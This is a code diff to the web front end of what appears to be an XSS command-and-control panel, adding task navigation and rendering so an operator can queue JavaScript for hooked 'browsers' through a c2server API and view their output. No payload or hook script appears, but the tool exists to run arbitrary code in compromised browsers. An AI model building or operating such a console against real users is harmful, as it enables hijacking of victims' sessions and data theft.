@@ -18,20 +18,18 @@
   <div class="container-fluid">
     <div class="row">
       <div class="col-sm-3 col-md-2 sidebar">
-        <h2>Active Browsers</h2>
+        <h2>Active Sessions</h2>
         <ul class="nav nav-sidebar nav-pills nav-stacked" id="xss-active-browsers">
         </ul>
-        <button id="xss-browser-refresh" type="button" class="btn btn-default">
-  <span class="glyphicon glyphicon-refresh" aria-hidden="true"></span>
-</button>
+
       </div>
       <div class="col-md-8 main">
-        <h2>Tasks</h2><button type="button" class="btn btn-default" aria-label="Left Align">
+        <h2>Tasks</h2><button id="xss-left" type="button" class="btn btn-default" aria-label="Left Align">
   <span class="glyphicon glyphicon-chevron-left" aria-hidden="true"></span>
 </button>
-        <span id="taskswitcher-num"><strong>New</strong></span>
-        <button type="button" class="btn btn-default" aria-label="Left Align">
-  <span class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
+        <span id="taskswitcher-num">New</span>
+        <button id="xss-right" type="button" class="btn btn-default" aria-label="Left Align">
+  <span  class="glyphicon glyphicon-chevron-right" aria-hidden="true"></span>
 </button>
         <button id="xss-submit" type="button" class="btn btn-default" aria-label="Left Align">
   <span class="glyphicon glyphicon-flash" aria-hidden="true"></span>
@@ -41,7 +39,7 @@
             <h3 class="panel-title">Request</h3>
           </div>
           <div class="panel-body">
-            <textarea id="xss-request" class="form-control" rows="8"> </textarea>
+            <textarea id="xss-request" class="form-control" rows="8" placeholder="Enter JavaScript..."> </textarea>
           </div>
         </div>
         <div class="panel panel-default">
@@ -49,7 +47,7 @@
             <h3 class="panel-title">Response</h3>
           </div>
           <div class="panel-body">
-            <textarea id="xss-response" class="form-control" rows="8"> </textarea>
+            <textarea id="xss-response" class="form-control" rows="8" readonly> </textarea>
           </div>
         </div>
 
@@ -88,6 +86,25 @@ function getdb(callback){
 
                     xhttp.send(); 
 }
+function renderNewTask(clientid){
+  clientid = parseInt(clientid);
+  var estTaskID = db.clients[findByID(db.clients,clientid)].tasks.length +1;
+  $('#taskswitcher-num').html('new ('+String(estTaskID)+')');
+  $('#xss-request').val('');
+  $('#xss-response').val('');
+  
+}
+function renderExistingTask(clientid,taskid){
+  clientid = parseInt(clientid);
+  taskid = parseInt(taskid);
+  $('#taskswitcher-num').html(String(taskid));
+  curclient = findByID(db.clients,clientid);
+  curtask  = findByID(db.clients[curclient].tasks,taskid);
+  console.debug(String(curclient)+':'+String(curtask));
+  $('#xss-request').val(String(db.clients[curclient].tasks[curtask].input));
+  console.debug(db.clients[curclient].tasks[curtask].input);
+  $('#xss-response').val(db.clients[curclient].tasks[curtask].output);
+}
 function getTaskOutput(clientid,taskid,callback){
       var xhttp = new XMLHttpRequest();
         xhttp.onreadystatechange = function () {
@@ -96,7 +113,25 @@ function getTaskOutput(clientid,taskid,callback){
                 console.debug("recieved output for task: "+String(taskid)+" output: "+task.output);
                 clientarrid = findByID(db.clients,clientid);
                 taskarrid = findByID(db.clients[clientarrid].tasks,taskid);
-                db.clients[clientarrid].tasks[taskarrid].output = task.output; 
+                db.clients[clientarrid].tasks[taskarrid].output = task.output;
+                      var cwtText = $('#taskswitcher-num').html();
+      var client = parseInt($("li.xss-browser.active").attr("browser-id"));
+      var cwt = null;
+      if (cwtText.includes("new")){
+        //split out the integer
+        tempcwt = cwtText.slice(5,cwtText.length-1);
+       cwt = parseInt(tempcwt);
+        
+      }
+      else{
+        cwt=parseInt(cwtText);
+      }
+      taskid = parseInt(taskid);
+      
+                if(client === clientid && cwt === taskid){
+                  renderExistingTask(clientid,taskid);
+                }
+                 
                                
                 if (typeof callback === "function") {callback();}
             }
@@ -183,23 +218,27 @@ function renderBrowsers(){
     $('#xss-active-browsers').html('');
   for (var i in db.clients) {
   if (tempbrowserid == db.clients[i].id){
-    $('#xss-active-browsers').append('<li class="xss-browser active" browser-id="'+String(db.clients[i].id)+'"><a href="#">Host '+String(db.clients[i].id)+'</a></li>');
+    $('#xss-active-browsers').append('<li class="xss-browser active" browser-id="'+String(db.clients[i].id)+'"><a href="#">Browser #'+String(db.clients[i].id)+'</a></li>');
   }
   else{
-    $('#xss-active-browsers').append('<li class="xss-browser" browser-id="'+String(db.clients[i].id)+'"><a href="#">Host '+String(db.clients[i].id)+'</a></li>');
+    $('#xss-active-browsers').append('<li class="xss-browser" browser-id="'+String(db.clients[i].id)+'"><a href="#">Browser #'+String(db.clients[i].id)+'</a></li>');
   }
   
 }
   });
 
 }
- function refresh() {
+ function refresh(auto=true) {
     // make Ajax call here, inside the callback call:
+    if (auto){
     setTimeout(refresh, 2000);
+    }
     renderBrowsers();
     pollTasks($("li.xss-browser.active").attr("browser-id"));
+
     // ...
 }
+
 
 // initial call, or just call refresh directly
 
@@ -212,10 +251,21 @@ function renderBrowsers(){
         $("li.xss-browser").removeClass("active");
         $(this).addClass("active");
         console.debug('browser selected: '+$(this).attr("browser-id"));
+        var tasklen = db.clients[findByID(db.clients,$(this).attr("browser-id"))].tasks.length;
+        console.debug("length of tasklist: "+String(tasklen));
+        if (tasklen === 0){
+          console.debug("tasklist empty, rendering 'newtask'");
+          //render new task
+          renderNewTask($(this).attr("browser-id"));
+        }
+        else{
+          console.debug("tasklist not empty, updating CWT to: "+String(tasklen));
+          //update cwt
+          //rendertask()
+          renderExistingTask($(this).attr("browser-id"),tasklen);
+        }
+refresh(auto=false);
         
-    });
-    $(document).on('click', '#xss-browser-refresh', function(){
-       renderBrowsers();
     });
     
     $(document).on('click', '#xss-submit',function(){ 
@@ -235,13 +285,59 @@ var json = JSON.stringify(task);
                 //find array id...
 
                 db.clients[findByID(db.clients,task.client)].tasks.push({id:task.id,input:task.input,output:null});
+                renderExistingTask(task.client,task.id);
             }
         };
         xhttp.open("POST", c2server + "/api/client/"+task.client+"/task/add", true);
                     xhttp.setRequestHeader("Content-type","application/json");
                     xhttp.send(json); 
 
-                $("#xss-request").val("");
+                
+    });
+    $(document).on('click', '#xss-right',function(){ 
+      if ($('#taskswitcher-num').html().includes('new')){
+        //do nothing... probably update this to something sexier, maybe parse out the number and compare it to array length
+        console.debug("[*] CWT contains 'new', doing nothing.");
+      }
+      else{
+        console.debug("[*] CWT does not contain 'new', doing something...");
+        var cwt = parseInt($('#taskswitcher-num').html());
+        var client = $("li.xss-browser.active").attr("browser-id");
+        var lentasklist = db.clients[findByID(db.clients,client)].tasks.length;
+        if(cwt >= lentasklist){
+          //cwt == lentasklist, procede to render new task
+          renderNewTask(client);
+        }
+        else{
+          //cwt is less than lentasklist, so renderexisting task (curtask + 1)
+          renderExistingTask(client,cwt+1);
+        }
+
+        
+      }
+      
+    });
+    $(document).on('click', '#xss-left',function(){
+      var cwtText = $('#taskswitcher-num').html();
+      var client = $("li.xss-browser.active").attr("browser-id");
+      var cwt = null;
+      if (cwtText.includes("new")){
+        //split out the integer
+        tempcwt = cwtText.slice(5,cwtText.length-1);
+       cwt = parseInt(tempcwt);
+        
+      }
+      else{
+        cwt=parseInt(cwtText);
+      }
+      if(cwt === 1){
+        //can't go back further, do nothing
+      }
+      else{
+        renderExistingTask(client,cwt-1);
+      }
+      
+    
     });
     refresh();
 });
